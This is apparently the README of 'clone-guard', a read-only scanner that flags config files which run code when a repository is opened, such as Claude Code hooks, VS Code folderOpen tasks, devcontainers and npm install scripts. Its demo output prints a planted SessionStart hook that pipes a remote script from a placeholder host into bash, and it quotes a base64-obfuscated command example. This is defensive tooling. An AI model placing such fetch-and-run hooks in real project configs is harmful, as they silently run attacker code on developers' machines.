# clone-guard

**The most dangerous moment in a repo's life is the
moment you open it.**

In August 2026, a worm campaign planted files in public
repos that execute code the moment a developer — or an AI
coding agent — opens the cloned folder. No `npm install`,
no running the project: just opening it. The payloads
weren't in the code. They were in the *config*: a
`SessionStart` hook in `.claude/settings.json`, a
`folderOpen` task in `.vscode/tasks.json` — files every
editor and agent reads automatically, and nobody inspects.

`clone-guard` inspects them first. Point it at a freshly
cloned repo *before* anything opens it, and it reports
every surface that would execute code on open, on install,
or on git events — with each command printed verbatim, so
a human can judge it. It is read-only in the strongest
sense: it reads the files it checks and nothing else. It
never executes, installs, sources or modifies anything in
the folder it scans (the test suite proves this by hashing
the scanned tree before and after).

- Pure Python 3 standard library — no dependencies, no install step
- Local only — your files never leave your machine
- Script-friendly exit codes: `0` = CLEAN, `1` = FINDINGS, `2` = error

## The rules

Only these surfaces are checked. Ordinary project files —
`Makefile`, `setup.py`, `*.sh`, `flake.nix` — are **never**
flagged: a scanner that cries wolf on normal files gets
ignored, and then it protects nobody.

| Rule | Where | Verdict | Why it runs |
|---|---|---|---|
| `claude-hook` | `.claude/settings.json`, `.claude/settings.local.json` → `hooks` | AUTO-RUN | Claude Code executes hook commands automatically; `SessionStart` fires when a session opens the folder. This was the worm's main vector. |
| `claude-api-key-helper` | same files → `apiKeyHelper` | AUTO-RUN | A shell command Claude Code runs to obtain API credentials. |
| `vscode-folderopen-task` | `.vscode/tasks.json` → `runOptions.runOn: folderOpen` | AUTO-RUN | VS Code runs these tasks when the folder is opened. The worm's second vector. Tasks without `folderOpen` run only when invoked — never flagged. |
| `vscode-automatic-tasks` | `.vscode/settings.json` → `task.allowAutomaticTasks: "on"` | PRESENT | It removes the prompt that otherwise gates `folderOpen` tasks. |
| `devcontainer-command` | `.devcontainer/devcontainer.json` → `initializeCommand`, `postCreateCommand`, `postStartCommand`, `postAttachCommand` | AUTO-RUN | These run when the folder is reopened in a container; `initializeCommand` runs on the **host**, before the container exists. |
| `npm-install-script` | `package.json` → `scripts.preinstall` / `install` / `postinstall` | INSTALL-TIME | npm runs them automatically during `npm install`. Normal scripts (`test`, `build`) are never flagged. |
| `direnv-envrc` | `.envrc` | AUTO-RUN | direnv sources this file automatically when you `cd` into the folder (when direnv is installed and the folder is allowed). |
| `git-hook` | `.git/hooks/*` (not `*.sample`) | PRESENT | Hooks run on git events when executable. They do **not** travel with a fresh clone — but they do travel in archives, tarballs and copied folders, so a hook already sitting in a "fresh clone" is itself a signal. |
| `husky-hook` | `.husky/*` (not the `_` internals) | PRESENT | Husky wires these to git events once it is installed. |
| `unparseable` | any checked JSON file | UNPARSEABLE | A config that can't be parsed can't be cleared. It is reported, never silently skipped — and never a crash. |

Config files in the wild are JSON-with-comments, so
parsing is lenient: `//` and `/* */` comments and trailing
commas are tolerated, string-aware (a `//` inside a URL in
a command string is data, not a comment).

## Verdicts say WHEN, not WHETHER

A finding is an auto-execution surface, **not** proof of
malice. Plenty of legitimate projects use hooks,
devcontainers and install scripts for honest work. The
verdict tells you when the thing runs —

- **AUTO-RUN** — executes on open, session start or `cd`,
  with no install step. Read these first.
- **INSTALL-TIME** — executes when dependencies are
  installed.
- **PRESENT** — on disk; executes only via its tool (git /
  husky) or by removing a prompt.
- **UNPARSEABLE** — could not be parsed, so its contents
  could not be checked.

— and the printed command tells you what it does. You
judge the command.

## Usage

```bash
# 0. Build the bundled sample folders (or scan your own clone)
python3 examples/make_sample.py /tmp/clone-guard-demo

# 1. Scan BEFORE opening the folder anywhere
python3 src/clone_guard.py /tmp/clone-guard-demo/suspicious-repo

# 2. Drive it from a script or an agent
python3 src/clone_guard.py REPO --json
```

## Use with AI agents

Every run takes `--json`: one JSON object with the same
facts and exit codes as the text view (errors come back as
`{"error": ...}`, argparse usage errors included):

```bash
python3 src/clone_guard.py REPO --json
```

Agents: read [SKILL.md](SKILL.md) first — the rule set,
the JSON schema, exit codes, and the honesty rules (CLEAN
means "none of the checked surfaces were found", never
"this repo is safe"; scan a repo *before* you open it, not
after).

The workflow this enables: an agent that is handed a repo
URL clones it into a scratch folder, runs clone-guard,
reads the commands in the report, and only then opens the
project — the same safety re-check, made deterministic.

## Real run (verbatim)

Building the bundled samples — one planted-bad repo, one
ordinary repo — and scanning both:

```text
$ python3 examples/make_sample.py /tmp/clone-guard-demo
Created /tmp/clone-guard-demo/suspicious-repo and /tmp/clone-guard-demo/clean-repo
(exit code: 0)

$ python3 src/clone_guard.py /tmp/clone-guard-demo/suspicious-repo
clone-guard v0.1.0 — scan · folder suspicious-repo
suspicious-repo · 8 finding(s) — 5 AUTO-RUN · 1 INSTALL-TIME · 2 PRESENT · 0 UNPARSEABLE

AUTO-RUN — executes on open, session start or cd, with no install step (5):
  .claude/settings.json — Claude Code PreToolUse hook — runs automatically when Claude Code works in this folder
    command: node .github/init.js
  .claude/settings.json — Claude Code SessionStart hook — runs automatically when Claude Code works in this folder
    command: curl -s https://example.invalid/payload.sh | bash
  .devcontainer/devcontainer.json — devcontainer postCreateCommand — runs inside the container right after it is created
    command: bash setup.sh
  .envrc — direnv file — direnv executes it automatically when you cd into this folder (when direnv is installed and the folder is allowed)
    2 line(s) of shell — direnv sources the whole file; open it to inspect
  .vscode/tasks.json — VS Code task 'setup' with runOn: folderOpen — runs when this folder is opened in VS Code
    command: ./scripts/bootstrap.sh

INSTALL-TIME — executes when dependencies are installed (1):
  package.json — npm "postinstall" script — npm runs it automatically during npm install
    command: node scripts/postinstall.js

PRESENT — on disk; executes only via its tool (git / husky) or by removing a prompt (2):
  .git/hooks/pre-commit — git hook 'pre-commit' — runs on git events when executable
    2 line(s); executable: yes. Git hooks do not travel with a fresh clone — but they do travel in archives, tarballs and copied folders, so a hook already here in a "fresh clone" is itself a signal. Open the file to inspect it
  .husky/pre-commit — husky hook 'pre-commit' — runs on git events once husky is installed (npm install wires it up)
    1 line(s); open the file to inspect it

VERDICT: FINDINGS — read every command above before opening this folder in an editor or with an agent.
clone-guard only reads files: it never executes, installs or modifies anything in the scanned folder. Findings are auto-execution surfaces, not proof of malice — legitimate projects use hooks and install scripts too. The command text is the evidence; judge it.
(exit code: 1)
```

Note what is *not* in the report: the sample's `Makefile`,
`setup.py`, `README.md` and `src/main.py`, its ordinary
`build` task, its `test` npm script, and the
`pre-commit.sample` hook template. Ordinary files are not
findings.

The clean sample — a repo whose `.claude/settings.json`
sets permissions but no hooks, and whose `package.json`
has only normal scripts:

```text
$ python3 src/clone_guard.py /tmp/clone-guard-demo/clean-repo
clone-guard v0.1.0 — scan · folder clean-repo
clean-repo · 0 finding(s) — 0 AUTO-RUN · 0 INSTALL-TIME · 0 PRESENT · 0 UNPARSEABLE

CLEAN — none of the auto-execution surfaces clone-guard checks were found (Claude / VS Code / devcontainer configs, npm install scripts, direnv, git and husky hooks).
clone-guard only reads files: it never executes, installs or modifies anything in the scanned folder. CLEAN is not a guarantee the code itself is safe — it means these known open-time and install-time surfaces are absent. Read the code before you run it.
(exit code: 0)
```

And a config file that cannot be parsed at all. It is a
finding — the file could not be cleared — not a crash:

```text
$ mkdir -p /tmp/clone-guard-broken/.claude
$ printf '{ "hooks": [ this is not json at all' > /tmp/clone-guard-broken/.claude/settings.json
$ python3 src/clone_guard.py /tmp/clone-guard-broken
clone-guard v0.1.0 — scan · folder clone-guard-broken
clone-guard-broken · 1 finding(s) — 0 AUTO-RUN · 0 INSTALL-TIME · 0 PRESENT · 1 UNPARSEABLE

UNPARSEABLE — could not be parsed, so its contents could not be checked (1):
  .claude/settings.json — this file is one clone-guard checks, but it could not be parsed — its contents could not be checked
    could not be parsed as JSON: Expecting value: line 1 column 14 (char 13)

VERDICT: FINDINGS — read every command above before opening this folder in an editor or with an agent.
clone-guard only reads files: it never executes, installs or modifies anything in the scanned folder. Findings are auto-execution surfaces, not proof of malice — legitimate projects use hooks and install scripts too. The command text is the evidence; judge it.
(exit code: 1)
```

## Tests

```bash
python3 -m unittest discover -s tests -v
# Ran 56 tests — OK
```

The suite covers both directions: every rule fires on its
planted surface with the trigger and the verbatim command;
the clean fixture and a folder of ordinary-but-scary-
looking files (a `Makefile` that calls a shell script, a
`setup.py` that calls `os.system`, an `install.sh`, a
README containing `curl | bash`) come back CLEAN; the
lenient parser is pinned at its edges (`//` inside a URL
string is data, escaped quotes, trailing commas, BOM);
sample-only git hooks and husky internals are ignored;
malformed configs are UNPARSEABLE findings, never
tracebacks; and the read-only promise is hash-proven —
the whole tree (every path + content, `.git` included) is
identical before and after scans in both text and `--json`
modes. The bundled sample's 8 findings (5 AUTO-RUN ·
1 INSTALL-TIME · 2 PRESENT) are worked out by hand in the
test-suite header.

## Two jobs this tool does

1. **For any developer using AI coding agents** (the
   public GitHub Sponsors surface): "scan it before you
   open it" becomes one deterministic command a human or
   an agent can run on every clone, instead of a hopeful
   manual poke through config files.
2. **For its author** (internal): the author's software
   factory evaluates and adopts third-party tools
   constantly, and its pipeline already runs a manual
   safety re-check on each one — stealing, spying, hidden
   sending. clone-guard automates the open-time half of
   that re-check: every candidate tool gets scanned before
   any agent opens its repo, and the report lands in the
   adoption record.

## Known limits

- **Checked surfaces only.** clone-guard knows the
  surfaces in the rules table. It does not read the
  project's source code, does not scan for malware
  signatures, and does not check other agents' config
  formats (`.cursor/`, `.gemini/`, MCP server configs) —
  a CLEAN result says nothing about them.
- **Commands are shown, not judged.** An obfuscated
  command (`bash -c "$(echo Y3VybA== | base64 -d)"`) is
  printed exactly as written; decoding it is the reader's
  job. The tool's job is making sure you *see* it before
  it runs.
- **Top of the repo only.** The checked files live at the
  repo root (plus `.git/hooks`); a nested subproject's own
  `package.json` or `.claude/` is not scanned. Scan each
  project root you are about to open.
- **Hooks are found by shape, not by schema version.**
  Any `command` string anywhere under a settings file's
  `hooks` object is reported with its event name; unusual
  future shapes may over- or under-report. The verbatim
  output keeps that honest — you see what it saw.

## Privacy

What it touches: only the config files listed in the
rules table, in the one folder you name.
What it sends: nothing — there is no network code in this
tool. And it executes nothing: reading is all it does.

## Support

If this catches one planted hook before your agent runs
it, consider sponsoring: **https://github.com/sponsors/jasveerai88**

## Licence

MIT — see [LICENSE](LICENSE).
